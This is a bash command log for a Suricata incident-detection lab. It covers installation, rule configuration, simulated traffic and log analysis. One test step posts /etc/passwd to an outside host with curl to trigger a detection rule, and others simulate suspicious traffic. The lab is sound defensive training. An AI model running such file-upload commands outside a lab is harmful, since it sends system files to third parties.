#!/bin/bash

# ==============================================================
# LAB 05 — Incident Detection with Suricata
# Commands Executed During Lab
# ==============================================================

# -------------------------------
# System Update
# -------------------------------
sudo apt update
sudo apt upgrade -y

# -------------------------------
# Install Suricata and Tools
# -------------------------------
sudo apt install suricata suricata-update jq -y

# -------------------------------
# Verify Installation
# -------------------------------
suricata --version

# -------------------------------
# Identify Network Interface
# -------------------------------
ip addr show

# -------------------------------
# Edit Suricata Configuration
# -------------------------------
sudo nano /etc/suricata/suricata.yaml

# Modify af-packet section:
# interface: ens5
# cluster-id: 99
# cluster-type: cluster_flow
# defrag: yes

# Modify HOME_NET:
# HOME_NET: "[172.16.0.0/12,10.0.0.0/8,192.168.1.0/24]"
# EXTERNAL_NET: "!$HOME_NET"

# -------------------------------
# Update Suricata Rules
# -------------------------------
sudo suricata-update
sudo suricata-update add-source emerging-threats https://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz
sudo suricata-update

# -------------------------------
# Create Custom Rules Directory
# -------------------------------
sudo mkdir -p /etc/suricata/rules/custom

# -------------------------------
# Create Custom Rules File
# -------------------------------
sudo nano /etc/suricata/rules/custom/lab-rules.rules

# -------------------------------
# Enable Custom Rules
# -------------------------------
sudo nano /etc/suricata/suricata.yaml
# Ensure:
# rule-files:
#   - suricata.rules
#   - custom/lab-rules.rules

# -------------------------------
# Test Configuration
# -------------------------------
sudo suricata -T -c /etc/suricata/suricata.yaml -v

# -------------------------------
# Start Suricata in Daemon Mode
# -------------------------------
sudo suricata -c /etc/suricata/suricata.yaml -i ens5 -D

# -------------------------------
# Verify Service Status
# -------------------------------
sudo systemctl status suricata
ps aux | grep suricata

# -------------------------------
# Generate ICMP Traffic
# -------------------------------
ping -c 10 8.8.8.8
ping -c 5 127.0.0.1

# -------------------------------
# Generate HTTP Traffic
# -------------------------------
sudo apt install curl -y
curl -s "http://httpbin.org/get?malware=test" > /dev/null
curl -s "http://httpbin.org/user-agent" -H "User-Agent: malicious-bot" > /dev/null
for i in {1..10}; do curl -s "http://httpbin.org/status/200" > /dev/null; sleep 1; done

# -------------------------------
# Generate SSH Attempts
# -------------------------------
sudo apt install nmap -y
for i in {1..6}; do timeout 2 nc -z 127.0.0.1 22; sleep 1; done

# -------------------------------
# Generate DNS Traffic
# -------------------------------
sudo apt install dnsutils -y
dig @8.8.8.8 malicious.example.com
dig @8.8.8.8 test-malware.com
dig @8.8.8.8 normal-website.com

# -------------------------------
# Analyze Logs
# -------------------------------
ls -la /var/log/suricata/
sudo tail -f /var/log/suricata/fast.log
sudo tail -20 /var/log/suricata/eve.json | jq '.'
sudo cat /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
sudo cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature' | sort | uniq -c

# -------------------------------
# Create Log Analyzer Script
# -------------------------------
nano suricata_analyzer.sh
chmod +x suricata_analyzer.sh
./suricata_analyzer.sh

# -------------------------------
# Real-Time Monitoring Script
# -------------------------------
nano monitor_alerts.sh
chmod +x monitor_alerts.sh
./monitor_alerts.sh

# -------------------------------
# Attack Simulation
# -------------------------------
nano attack_simulator.sh
chmod +x attack_simulator.sh
./attack_simulator.sh

# -------------------------------
# Incident Response Playbook
# -------------------------------
nano incident_response.sh
chmod +x incident_response.sh
./incident_response.sh

# -------------------------------
# Performance Monitoring
# -------------------------------
sudo tail -20 /var/log/suricata/stats.log
nano performance_monitor.sh
chmod +x performance_monitor.sh
./performance_monitor.sh

# -------------------------------
# Advanced Python Parser
# -------------------------------
nano advanced_parser.py
chmod +x advanced_parser.py
sudo python3 advanced_parser.py

# -------------------------------
# Alert Dashboard
# -------------------------------
nano alert_dashboard.sh
chmod +x alert_dashboard.sh
./alert_dashboard.sh

# -------------------------------
# Advanced Rule Creation
# -------------------------------
sudo nano /etc/suricata/rules/custom/advanced-rules.rules

# Enable advanced rules
sudo nano /etc/suricata/suricata.yaml
# Ensure:
#   - custom/advanced-rules.rules

sudo suricata -T -c /etc/suricata/suricata.yaml -v
sudo systemctl restart suricata
sudo systemctl status suricata

# -------------------------------
# Test Advanced Rules
# -------------------------------
curl -s -H "User-Agent: malicious-bot-scanner" "http://httpbin.org/get" > /dev/null
curl -s -X POST -F "file=@/etc/passwd" "http://httpbin.org/post" > /dev/null
sudo tail -20 /var/log/suricata/fast.log

# -------------------------------
# Rule Performance Analysis
# -------------------------------
nano rule_performance.sh
chmod +x rule_performance.sh
./rule_performance.sh

# -------------------------------
# Final Health Check
# -------------------------------
sudo systemctl status suricata
top -bn1 | grep suricata
ls -lh /var/log/suricata/
